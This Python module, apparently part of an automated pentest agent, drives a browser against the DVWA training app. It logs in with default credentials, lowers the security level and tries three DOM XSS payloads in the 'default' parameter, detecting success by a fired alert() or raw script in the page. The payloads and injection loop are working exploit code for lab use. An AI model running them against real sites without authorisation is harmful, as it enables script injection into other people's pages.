# agent/src/skills/xss_dom_low.py
from pathlib import Path
from urllib.parse import urlencode
from ..tools.browser import Browser

# payloads comuns que funcionam no DVWA DOM XSS (param "default")
CANDIDATES = [
    '<script>alert("domxss")</script>',
    '"><script>alert(\'domxss\')</script>',
    '<img src=x onerror=alert("domxss")>',
]

def run(base_url: str) -> dict:
    with Browser(base_url) as b:
        # 1) login
        b.goto("/login.php")
        b.page.wait_for_selector('input[name="username"]', timeout=15000)
        b.fill('input[name="username"]', "admin")
        b.fill('input[name="password"]', "password")
        b.click('input[type="submit"]')
        b.page.wait_for_load_state("domcontentloaded")

        # 2) tentar setar Security=Low (best-effort)
        try:
            b.goto("/security.php")
            b.page.wait_for_selector('select[name="security"]', timeout=5000)
            b.page.select_option('select[name="security"]', 'low')
            if b.page.locator('input[name="seclev_submit"]').count() > 0:
                b.click('input[name="seclev_submit"]')
            else:
                b.click('input[type="submit"]')
            b.page.wait_for_load_state("domcontentloaded")
        except Exception:
            pass

        # 3) hook para capturar alert()
        alert = {"ok": False, "message": ""}
        def on_dialog(d):
            alert["ok"] = True
            alert["message"] = d.message
            d.accept()
        b.page.on("dialog", on_dialog)

        # 4) baseline: página “limpa”
        b.goto("/vulnerabilities/xss_d/?default=English")
        b.page.wait_for_selector("#main_menu", timeout=10000)  # qualquer âncora estável
        base_html = b.content()

        # 5) tentar payloads via GET (?default=...)
        for p in CANDIDATES:
            qs = urlencode({"default": p})
            b.goto(f"/vulnerabilities/xss_d/?{qs}")
            b.page.wait_for_timeout(1200)  # dá tempo do JS DOM executar

            html = b.content()
            raw_present = ("<script" in html and "alert(" in html)  # às vezes aparece cru no DOM
            if alert["ok"] or raw_present:
                # screenshot
                agent_dir = Path(__file__).resolve().parents[2]
                screens_dir = agent_dir.parent / "screens"
                screens_dir.mkdir(parents=True, exist_ok=True)
                screenshot_path = screens_dir / "xss_dom_low.png"
                b.page.screenshot(path=str(screenshot_path), full_page=True)

                return {
                    "ok": True,
                    "vector": "DOM XSS (Low)",
                    "payload": p,
                    "reason": (f'alert() fired: "{alert["message"]}"' if alert["ok"] else "raw <script> found"),
                    "evidence_contains": p if raw_present else html[:1200],
                    "screenshot": str(screenshot_path),
                    "url": b.page.url,
                }

        # 6) falhou – salva screenshot para diagnóstico também
        try:
            agent_dir = Path(__file__).resolve().parents[2]
            screens_dir = agent_dir.parent / "screens"
            screens_dir.mkdir(parents=True, exist_ok=True)
            screenshot_path = screens_dir / "xss_dom_low_fail.png"
            b.page.screenshot(path=str(screenshot_path), full_page=True)
        except Exception:
            screenshot_path = None

        return {
            "ok": False,
            "vector": "DOM XSS (Low)",
            "payload": CANDIDATES[-1],
            "reason": "no alert and no raw script detected",
            "evidence_contains": base_html[:1200],
            "screenshot": str(screenshot_path) if screenshot_path else None,
            "url": b.page.url,
        }
